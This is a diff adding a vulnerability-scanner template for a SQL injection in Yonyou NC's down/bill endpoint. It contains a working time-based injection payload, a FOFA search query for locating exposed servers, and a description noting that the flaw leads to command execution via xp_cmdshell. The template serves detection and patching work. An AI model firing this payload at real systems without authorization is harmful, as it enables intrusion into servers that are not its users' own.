@@ -1,0 +1,29 @@
+id: yonyou-nc-down-bill-sqli
+
+info:
+  name: Yonyou NC down/bill - SQL Injection
+  author: Co5mos
+  severity: high
+  description: |
+    用友NC //portal/pt/erfile/down/bill接口的id参数存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://github.com/wy876/POC/blob/437fad5c987d7a15441fd5e05cb793b08181809b/%E7%94%A8%E5%8F%8BNC-bill%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    fofa-query: icon_hash="1085941792" && body="/logo/images/logo.gif"
+  tags: yonyou,sqli
+
+http:
+  - raw:
+    - |
+      @timeout: 10s
+      GET /portal/pt/erfile/down/bill?pageId=login&id=1'+AND+4563=DBMS_PIPE.RECEIVE_MESSAGE(CHR(65),4)-- HTTP/1.1
+      Host: {{Hostname}}
+      Content-Type: application/x-www-form-urlencoded
+      Accept-Charset: utf-8
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration>=4
+          - status_code == 500
+        condition: and
